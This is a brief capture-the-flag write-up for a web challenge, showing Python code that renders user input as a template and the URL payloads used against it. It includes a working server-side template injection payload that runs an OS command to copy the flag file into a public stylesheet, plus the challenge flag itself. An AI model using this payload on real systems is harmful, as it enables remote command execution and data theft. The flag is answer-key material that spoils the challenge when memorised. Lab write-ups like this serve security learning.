
#### vulnerable code to SSTI

```text
web_spookifier\challenge\application\util.py
```

```python
def generate_render(converted_fonts):
	result = '''
		<tr>
			<td>{0}</td>
        </tr>
        
		<tr>
        	<td>{1}</td>
        </tr>
        
		<tr>
        	<td>{2}</td>
        </tr>
        
		<tr>
        	<td>{3}</td>
        </tr>

	'''.format(*converted_fonts)
	
	return Template(result).render()
```



```bash
http://161.35.33.46:31648/?text=${{7*7}}
```

![[s1.png]]

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#direct-access-to-os-from-templatenamespace

#### exploit 

```text
http://161.35.33.46:31648/?text=${self.module.cache.util.os.system(%22cp%20flag.txt%20/app/application/static/css/index3.css%22)}
```

![[s2.png]]

```text
HTB{t3mpl4t3_1nj3ct10n_1s_$p00ky!!}
```